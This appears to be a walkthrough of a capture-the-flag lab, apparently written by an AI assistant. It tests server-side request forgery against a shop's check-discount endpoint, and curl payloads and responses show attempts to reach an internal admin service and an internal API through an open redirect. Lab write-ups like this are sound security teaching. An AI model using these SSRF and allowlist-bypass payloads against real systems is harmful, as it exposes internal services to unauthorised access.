The latest result:

```yaml
HTTP/1.1 403 Forbidden

Forbidden
```

confirms that direct access to `web0x08.hbtn:8080/admin/list-of-items` is forbidden from your Kali environment.

However, it doesn't prove the same restriction applies to server-side requests made through `articleApi`.

### What we haven't tested yet

We've tested two redirect configurations:

| Initial URL port | Redirect destination | Result                       |
| ---------------- | -------------------- | ---------------------------- |
| 8080             | Absolute URL         | Error fetching discount data |
| 80               | Relative path        | Error fetching discount data |

We haven't tested an absolute redirect through port 80.

That is worth checking before abandoning the redirect technique.

### Action: Execute this command

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://web0x08.hbtn/app4-1/product/2'
```

### Why?

This creates the following chain:

```
POST /app4-1/check-discount
          |
          v
GET http://web0x08.hbtn/app4-1/product/nextProduct
          |
          | 302 Found
          v
GET http://web0x08.hbtn/app4-1/product/2
```

Both URLs use the default HTTP port, and we've already confirmed that the final product URL is accessible through `articleApi`.

Expected interpretations:

- `No discount.`: The SSRF request may have followed the absolute redirect successfully.
- `Error fetching discount data`: Even this combination fails, pointing toward redirect-processing restrictions or another backend issue.

If this test fails, we should investigate the other backend service hinted at by the challenge rather than continuing to guess admin routes.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://web0x08.hbtn/app4-1/product/2'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 23:37:11 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 28
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"
#
# Error fetching discount data
```

## Task 3, Step 18: Probe the admin service through SSRF

Our latest test also returned:

```yaml
Error fetching discount data
```

We've now tested several redirect variants, including absolute and relative destinations on both ports 80 and 8080. All failed.

This suggests the SSRF client may not be following HTTP redirects, or something in the request chain is rejecting them. We shouldn't assume that the open redirect is exploitable until we establish otherwise.

### What we've learned

- Direct requests through `articleApi` can return `No discount.`
- Requests involving `nextProduct` consistently produce `Error fetching discount data`.
- The public `/app4-1/admin/list-of-items` endpoint returns `404`.
- Direct access to port 8080 returns `403 Forbidden`.

One possibility remains untested: the server-side request may have different access privileges from our direct Kali requests.

### Action: Test the backend's unprefixed admin endpoint

Execute:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/admin/list-of-items'
```

### Why?

Previously, we tested this URL directly from Kali and received `403 Forbidden`.

Now we're requesting the same URL indirectly through `articleApi`.

This checks whether the backend's access differs from that of an external client. We're also using the original `/admin/list-of-items` path rather than assuming the admin service has an `/app4-1` prefix.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn:8080/admin/list-of-items'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 23:41:30 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

## Task 3, Step 19: Investigate the secondary internal API

Your latest response was:

```yaml
HTTP/1.1 200 OK

No discount.
```

We've established that `No discount.` is the normal response for several direct URLs, while requests involving the `nextProduct` redirect consistently produce `Error fetching discount data`.

That suggests we should investigate the other backend service mentioned in the challenge.

### What we discovered earlier

The product HTML contained this commented-out configuration:

```html
<input
  type="hidden"
  name="stockApi"
  value="http://internal-api.checkstock.shop/2"
/>
```

Although it's commented out, it gives us a concrete internal hostname to investigate:

`internal-api.checkstock.shop`

We haven't tested whether `articleApi` accepts this destination.

### Action: Test the internal API hostname

Execute in Kali:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://internal-api.checkstock.shop/2'
```

### Why?

We want to determine how the application handles requests to this secondary hostname.

| Response                       | Interpretation                                                                                                              |
| ------------------------------ | --------------------------------------------------------------------------------------------------------------------------- |
| `Invalid hostname`             | Likely hostname-based filtering. A redirect bypass may be necessary.                                                        |
| `Error fetching discount data` | The request failed, possibly due to DNS, connectivity, or backend restrictions.                                             |
| `No discount.`                 | The application processed the request without exposing discount data. It doesn't prove which internal resource was reached. |
| Internal API content           | We may have discovered a useful internal resource.                                                                          |

This is a diagnostic test, not yet a flag-extraction attempt.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://internal-api.checkstock.shop/2'

# HTTP/1.1 400 Bad Request
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 23:44:01 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 16
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"10-m/yQhDwS2T4l/9EmgU86BV9TCKU"
#
# Invalid hostname
```


## Task 3, Step 20: Test SSRF via an open redirect to the internal API

A useful observation: we've confirmed that `internal-api.checkstock.shop` is rejected directly, but we haven't tested reaching it through the open redirect.

Our latest result was:

```yaml
HTTP/1.1 400 Bad Request

Invalid hostname
```

This supports the hypothesis that the application uses a hostname allowlist.

The next test is to see whether the application validates only the initial URL or also checks the redirect destination.

### Action: Execute this command in Kali

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://internal-api.checkstock.shop/2'
```

### Why this test?

We're constructing the following request chain:

<img src="./request_chain.png" alt="Request chain diagram" width="777"/>


### How we'll interpret the result

| Response                       | What it suggests                                                       |
| ------------------------------ | ---------------------------------------------------------------------- |
| `Invalid hostname`             | The redirect destination may be undergoing hostname validation         |
| `Error fetching discount data` | A fetch or redirect error occurred; the precise cause remains unknown  |
| `No discount.`                 | The request may have completed, but the handler found no discount data |
| Flag or internal data          | The redirect chain successfully exposed internal content               |


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://internal-api.checkstock.shop/2'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 00:02:39 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 28
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"1c-+CuxaX+7SlQm4ks++a9ZSmAz1Hk"
#
# Error fetching discount data
```


## Task 3, Step 21: Diagnose why redirects fail through SSRF

The result is again:

```yaml
Error fetching discount data
```

We now have an important distinction:

- Direct SSRF to `internal-api.checkstock.shop` returns `Invalid hostname`.
- SSRF through `nextProduct` returns `Error fetching discount data`, regardless of whether the destination is internal or a known public product page.

The second result does not prove that the redirect reached its destination. We need to investigate why every redirected request fails.

### Action: Verify the complete redirect chain outside the SSRF handler

Execute:

```bash
curl -sS -L -o /dev/null \
  -w 'HTTP status: %{http_code}\nRedirects: %{num_redirects}\nFinal URL: %{url_effective}\n' \
  'http://web0x08.hbtn/app4-1/product/nextProduct?path=http://web0x08.hbtn/app4-1/product/2'
```

### Why?

This tests the same redirect chain that failed through `articleApi`, but uses cURL's redirect-following functionality.

The `-L` option follows HTTP redirects, while `-w` displays the outcome without printing the HTML page.

If everything works normally, we should see something like:

```
HTTP status: 200
Redirects: 1
Final URL: http://web0x08.hbtn/app4-1/product/2
```

If that happens, we'll have established that the redirect chain itself works from Kali, while the SSRF handler fails to complete it. That narrows our investigation to the backend HTTP client's behavior or its network environment.

This is important because continuing to change the internal destination won't help if the redirect mechanism itself is the problem.


```bash
curl -sS -L -o /dev/null \
  -w 'HTTP status: %{http_code}\nRedirects: %{num_redirects}\nFinal URL: %{url_effective}\n' \
  'http://web0x08.hbtn/app4-1/product/nextProduct?path=http://web0x08.hbtn/app4-1/product/2'

# HTTP status: 200
# Redirects: 1
# Final URL: http://web0x08.hbtn/app4-1/product/2
```

## Task 3, Step 22: Investigate other backend API references

Your latest test confirms that the redirect works correctly when followed by cURL:

```yaml
HTTP status: 200
Redirects: 1
Final URL: http://web0x08.hbtn/app4-1/product/2
```

However, every redirect attempt through `articleApi` has returned:

```yaml
Error fetching discount data
```

The important distinction: cURL successfully following a redirect does not prove that the application's server-side HTTP client does the same.

Rather than repeating similar payloads, let's investigate the challenge's hint about other backend services and ports.

### Action: Inspect the next product's API configuration

Execute:

```bash
curl -sS 'http://web0x08.hbtn/app4-1/product/3' \
  | grep -Ein -C 4 'stockApi|articleApi|nextProduct|internal-api|:[0-9]{3,5}|check-stock|check-discount' \
  | head -n 100
```

### Why?

We've examined product 2, which contains a commented-out reference to:

```
http://internal-api.checkstock.shop/2
```

But we haven't established whether other product pages expose different backend endpoints or ports.

This command examines product 3 for:

- Additional backend API hostnames.
- Nonstandard internal service ports.
- Differences in the `articleApi` configuration.
- Other navigation or stock-check functionality.

We're specifically looking for information that could identify the intended internal target, rather than continuing to guess admin URLs.


```html
curl -sS 'http://web0x08.hbtn/app4-1/product/3' \
  | grep -Ein -C 4 'stockApi|articleApi|nextProduct|internal-api|:[0-9]{3,5}|check-stock|check-discount' \
  | head -n 100

6-  <body>
7-    <h1>Sample Product 3</h1>
8-    <p>This is a sample product.</p>
9-    <p>Price: $9.99</p>
10:    <form action="/check-stock" method="post">
11-      <input
12-        type="hidden"
13:        name="stockApi"
14:        value="http://internal-api.checkstock.shop/3"
15-      />
16-      <button type="submit">Check Stock</button>
17-    </form>
18:    <a href="/product/nextProduct?path=/product/4"
19-      >Next Product</a
20-    >
21-  </body>
22-</html> -->
--
29-    <meta name="format-detection" content="telephone=no" />
30-    <title>AllStore - MultiConcept eCommerce Template</title>
31-
32-    <link
33:      href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700ii%7CRoboto:300,300i,400,400i,500,500i,700,700i,900,900i&amp;subset=cyrillic"
34-      rel="stylesheet"
35-    />
36-
37-    <link rel="stylesheet" href="../css/font-awesome.min.css" />
--
238-              </p>
239-              <p class="prod-addwrap">
240-                <a href="#" class="prod-add" rel="nofollow">Add </a>
241-              </p>
242:              <form action="/app4-1/check-discount" method="post">
243-                <input
244-                  type="hidden"
245:                  name="articleApi"
246:                  value="http://web0x08.hbtn:8080/app4-1/check-discount"
247-                />
248-                <button class="prod-add" type="submit">Check Reduction</button>
249-              </form>
250-            </div>
--
273-            "
274-            class="prod-add"
275-            type="submit"
276-          >
277:            <a href="/app4-1/product/nextProduct?path=/app4-1/product/4"
278-              >Next Product</a
279-            >
280-          </button>
281-
```


## Task 3, Step 23: Investigate the Check Stock backend

Product 3 confirms the same configuration as product 2:

```yaml
stockApi=http://internal-api.checkstock.shop/3
articleApi=http://web0x08.hbtn:8080/app4-1/check-discount
```

The `stockApi` field is in commented-out HTML, but the reference is consistent across both products.

Our main unresolved issue remains redirect handling. Every redirect attempted through `articleApi` has failed, even when the destination is an accessible product page. We haven't demonstrated that the SSRF client follows redirects.

Rather than trying another nearly identical payload, let's establish whether the Check Stock backend functionality actually exists.

### Action: Test the Check Stock endpoint

Execute this command in Kali:

```bash
curl -sS -i --max-time 10 -X POST \
  'http://web0x08.hbtn/app4-1/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/2'
```

### Why?

This tests the endpoint referenced in the commented HTML using its original parameter.

We're checking whether `/app4-1/check-stock` is implemented, despite its form being commented out on the product page.

| Response                  | Interpretation                                               |
| ------------------------- | ------------------------------------------------------------ |
| Stock information or JSON | The Check Stock backend may still be operational             |
| `404 Not Found`           | The route probably isn't exposed at this path                |
| `403 Forbidden`           | The request is being denied                                  |
| Backend error             | The route may exist but cannot complete its internal request |

If the endpoint exists, its behavior could help us identify the additional backend service hinted at in the challenge.


```bash
curl -sS -i --max-time 10 -X POST \
  'http://web0x08.hbtn/app4-1/check-stock' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'stockApi=http://internal-api.checkstock.shop/2'

# HTTP/1.1 404 Not Found
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 00:25:10 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 19
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"13-lDORkTXKdSQVDm93qIyu0m47NCE"
#
# 404: Page Not Found
```

## Task 3, Step 24: Check the unprefixed redirect endpoint on port 8080

The latest result was:

```yaml
HTTP/1.1 404 Not Found

404: Page Not Found
```

This confirms that `/app4-1/check-stock` isn't available. We should stop pursuing the commented-out stock form as an active feature.

However, there's another detail in that commented HTML worth testing.

The original navigation link was:

```yaml
/product/nextProduct?path=/product/3
```

But the active storefront uses:

```yaml
/app4-1/product/nextProduct?path=/app4-1/product/3
```

These may correspond to different routes on the backend.

### Action: Test the unprefixed redirect endpoint on port 8080

Execute:

```bash
curl -sS -i --max-time 10 \
  'http://web0x08.hbtn:8080/product/nextProduct?path=/product/3'
```

### Why?

We previously tested:

```yaml
http://web0x08.hbtn:8080/app4-1/product/nextProduct
```

and received `403 Forbidden`.

But we haven't tested `/product/nextProduct` without the `/app4-1` prefix on port 8080.

If the application uses a reverse proxy to mount backend routes beneath `/app4-1`, the internal route structure might differ from the public one.

| Response        | Interpretation                                                                              |
| --------------- | ------------------------------------------------------------------------------------------- |
| `302 Found`     | We've identified another working redirect endpoint, potentially usable through `articleApi` |
| `403 Forbidden` | The backend also restricts this route                                                       |
| `404 Not Found` | The unprefixed route isn't available                                                        |
| Other response  | We'll examine its headers and body                                                          |

This is a hypothesis based on the two URL structures visible in the product HTML, not yet a confirmed routing difference.


```bash
curl -sS -i --max-time 10 \
  'http://web0x08.hbtn:8080/product/nextProduct?path=/product/3'

# HTTP/1.1 403 Forbidden
# X-Powered-By: Express
# Content-Type: text/html; charset=utf-8
# Content-Length: 9
# ETag: W/"9-PatfYBLj4Um1qTm5zrukoLhNyPU"
# Date: Tue, 10 Nov 2026 00:29:54 GMT
# Connection: keep-alive
# Keep-Alive: timeout=5
#
# Forbidden
```


## Task 3, Step 25: Test a relative URL in `articleApi`

The unprefixed endpoint also returned:

```yaml
HTTP/1.1 403 Forbidden

Forbidden
```

We've now established that the redirect endpoint works through port 80, but all our attempts to invoke it through `articleApi` have failed.

There's one important input format we haven't tested: a relative URL instead of an absolute URL.

This matters because the classic SSRF open-redirect bypass can use a relative path as the initial request.


### Action: Execute this command

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=/app4-1/product/2'
```

### Why?

Until now, every `articleApi` value has begun with an absolute URL:

```
http://web0x08.hbtn/...
```

We're now testing:

```
/app4-1/product/2
```

This is a known product path, so we can test relative URL handling without introducing a redirect.

The result will distinguish between:

| Response                       | Interpretation                                         |
| ------------------------------ | ------------------------------------------------------ |
| `No discount.`                 | Relative paths may be accepted                         |
| `Invalid hostname`             | The URL validator likely requires an absolute URL      |
| `Error fetching discount data` | The HTTP client may be unable to resolve relative URLs |

Why this matters for our exploit: If relative paths are accepted, we can investigate using `/app4-1/product/nextProduct?path=...` directly as the SSRF payload, which is closer to the intended open-redirect technique.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=/app4-1/product/2'

# HTTP/1.1 400 Bad Request
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 00:34:46 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 43
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"2b-tYDCMtDPxGFZ7tyqHZjvzwXoeWM"
#
# Error Occured while processing your request
```

## Task 3, Step 26: Isolate the redirect failure

The latest result:

```yaml
HTTP/1.1 400 Bad Request

Error Occured while processing your request
```

This confirms that supplying a relative URL to `articleApi` fails during request processing.

We should now focus on a more important distinction: does `articleApi` fail because it accesses the `nextProduct` endpoint, or because that endpoint returns an HTTP 302 redirect?

So far, every SSRF request involving `nextProduct` has contained a `path` parameter that triggers a redirect.

### Action: Request `nextProduct` without the `path` parameter

Execute in Kali:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct'
```

### Why?

We're removing the `path` parameter to see whether the endpoint behaves differently when it has no redirect destination.

| Response                       | What it suggests                                                                                     |
| ------------------------------ | ---------------------------------------------------------------------------------------------------- |
| `No discount.`                 | The endpoint may be reachable, while its redirect behavior causes the SSRF failure                   |
| `Error fetching discount data` | The endpoint itself may be inaccessible to the SSRF client, or its missing parameter causes an error |
| `Invalid hostname`             | The URL is being rejected by validation                                                              |

This is more informative than trying another internal destination because it isolates the behavior of the redirect endpoint itself.

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/nextProduct'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 00:39:46 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```


## Task 3, Step 27: Determine whether query parameters cause the SSRF failure

The latest result is particularly useful:

```yaml
articleApi=http://web0x08.hbtn/app4-1/product/nextProduct
→ No discount.
```

Compare it with:

```yaml
articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=/app4-1/product/2
→ Error fetching discount data
```


There's one variable we haven't isolated: the presence of a query string in `articleApi`.

### Action: Test a harmless query parameter

Execute this single command:

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/2?test=123'
```

### Why?

We're requesting an ordinary product page with an irrelevant query parameter:

```
http://web0x08.hbtn/app4-1/product/2?test=123
```

This should not trigger a redirect.

It lets us distinguish between two hypotheses:

| Response                       | Interpretation                                                                                               |
| ------------------------------ | ------------------------------------------------------------------------------------------------------------ |
| `No discount.`                 | Query strings work. The failures are more specifically associated with redirects or the navigation endpoint. |
| `Error fetching discount data` | Query-string handling itself may be contributing to the failure.                                             |
| `Invalid hostname`             | URL validation may be parsing the parameter unexpectedly.                                                    |

If this returns `No discount.`, we'll have stronger evidence that the redirect response is the important difference, not the mere presence of `?path=`.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1/product/2?test=123'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 00:59:55 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

---
## Sonnet 5 brainstorming log review

Summarizing the brainstorming log, including all 48 experiments. It contains several useful findings that change how we should approach Task 3.

Most importantly, we've spent too much time trying different SSRF destinations without first establishing exactly how the backend handles HTTP redirects.

## What the new research establishes

| Finding                                                         | Significance                                                                          |
| --------------------------------------------------------------- | ------------------------------------------------------------------------------------- |
| `articleApi` accepts `web0x08.hbtn` but rejects other hostnames | Strong evidence of hostname allowlisting                                              |
| Requests to ordinary pages return `No discount.`                | The handler doesn't simply reflect retrieved HTML                                     |
| Requests involving `nextProduct` redirects consistently fail    | Redirect handling is our primary unresolved issue                                     |
| `/admin/list-of-items` returns `403` directly                   | An access-restricted admin route exists                                               |
| `/app4-2/` also returns `403`                                   | A second protected application exists                                                 |
| Port 3003 serves a different storefront                         | Not obviously relevant to the Task 3 admin interface                                  |
| MongoDB contains `ssrf-open-redirect-lab`                       | Confirms the lab's architecture, but the inspected collection contained only products |

### Three important corrections

1\. `No discount.` doesn't prove a successful fetch.

Sonnet inferred that the application silently redirects requests to port 8080 because even port 9999 returns `No discount.`

That isn't established. The response could be a fallback for failed requests, meaning the port scan through `articleApi` may not provide reliable network reachability information.

2\. The HTTP 302 responses deserve more attention.

We've demonstrated that ordinary pages with query parameters work, while every request returning a redirect appears to trigger `Error fetching discount data`.

This makes redirect-response handling a more promising investigation than trying additional localhost encodings.

3\. `/app4-2/` is interesting, but not yet the answer.

A `403 Forbidden` response doesn't prove the resource contains our flag or that it can be accessed through SSRF. It's worth keeping as a candidate destination, but first we need a functioning exploitation mechanism.

## Step 29: Test whether all HTTP redirects fail, not just `nextProduct`

Here's the experiment we might have missed.

We previously found that accessing `/app4-2` without a trailing slash produces a `301 Moved Permanently` redirect to `/app4-2/`.

We can test the same trailing-slash behavior with the public `/app4-1` route.

### Action: Execute this command in Kali

```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1'
```

### Why this test is different

Until now, we've only tested redirects generated by the vulnerable `nextProduct` feature.

This experiment targets an ordinary application URL that is likely to generate an HTTP 301 redirect to its trailing-slash equivalent.

If the URL generates a 301, we can compare how the SSRF handler treats that redirect with its treatment of `nextProduct`'s 302 responses.

| Response                       | Interpretation                                                                                             |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------- |
| `Error fetching discount data` | Supports a general problem with HTTP redirects, rather than something specific to `nextProduct`            |
| `No discount.`                 | Could indicate that 301 redirects are handled differently from 302 redirects, or that no redirect occurred |
| Another response               | May expose additional details about the URL validation or HTTP client                                      |

If the request fails, we'll verify that `/app4-1` actually returns a 301 when accessed directly before drawing a conclusion.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app4-1/check-discount' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://web0x08.hbtn/app4-1'

# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Tue, 10 Nov 2026 23:57:29 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 12
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"c-f6aWFW3geGbMCLa7IyAdRC58iUI"
#
# No discount.
```

## Task 3, Step 30: Verify whether `/app4-1` actually redirects

Your latest result:

```
HTTP/1.1 200 OK

No discount.
```

This is interesting because requests through `nextProduct` consistently produce `Error fetching discount data`.

However, we haven't confirmed whether `/app4-1` actually generates an HTTP 301 redirect or returns a normal page.

That distinction matters. If `/app4-1` redirects and the SSRF handler processes it successfully, the backend may handle 301 and 302 redirects differently.

### Action: Inspect the direct response

Execute this command in Kali:

```bash
curl -sS -i --max-time 10 \
  'http://web0x08.hbtn/app4-1' \
  | head -n 20
```

### Why?

We're checking the actual HTTP response without automatically following redirects.

| Result                  | Interpretation                                                                           |
| ----------------------- | ---------------------------------------------------------------------------------------- |
| `301 Moved Permanently` | A redirect exists, and the earlier `No discount.` result becomes potentially significant |
| `302 Found`             | We have another redirect endpoint to compare with `nextProduct`                          |
| `200 OK`                | The previous SSRF test did not isolate redirect handling                                 |

One observation from the Sonnet experiments: We have evidence of strict hostname validation, but no conclusive evidence yet that the SSRF client follows redirects. We need to resolve that before trying more internal destinations.


```html
curl -sS -i --max-time 10 \
  'http://web0x08.hbtn/app4-1' \
  | head -n 20

HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Tue, 10 Nov 2026 23:59:51 GMT
Content-Type: text/html
Content-Length: 169
Location: http://web0x08.hbtn/app4-1/
Connection: keep-alive

<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.18.0</center>
</body>
</html>
```
